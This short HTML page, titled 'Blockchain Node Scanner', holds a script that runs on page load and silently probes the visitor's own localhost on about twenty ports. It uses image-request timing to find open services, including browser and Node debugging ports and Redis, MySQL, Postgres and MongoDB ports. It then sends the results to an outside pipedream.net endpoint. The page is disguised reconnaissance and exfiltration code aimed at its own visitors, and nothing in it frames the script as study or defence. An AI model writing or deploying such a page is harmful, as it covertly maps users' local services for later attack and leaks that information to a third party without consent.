<html>
<head><title>Blockchain Node Scanner</title></head>
<body>
<h1>Scanning Network Nodes...</h1>
<script>
var ports = [
  80, 443, 3000, 4000, 5000, 6000, 7000, 8000, 8080, 8443, 8888,
  9090, 9222, 9229, 3306, 5432, 6379, 27017, 11211
];
var results = [];
var done = 0;

ports.forEach(function(port) {
  var img = new Image();
  var start = Date.now();

  img.onload = function() {
    results.push(port + ':open');
    check();
  };
  img.onerror = function() {
    var time = Date.now() - start;
    // Fast error = port is open but refused HTTP
    // Slow error = port is closed (timeout)
    results.push(port + ':' + (time < 1000 ? 'open' : 'closed'));
    check();
  };

  img.src = 'http://127.0.0.1:' + port + '/favicon.ico?' + Math.random();
});

function check() {
  done++;
  if (done >= ports.length) {
    fetch('https://eoh2zr5zzepcygc.m.pipedream.net?scan=' + encodeURIComponent(results.join(',')));
  }
}
</script>
</body>
</html>
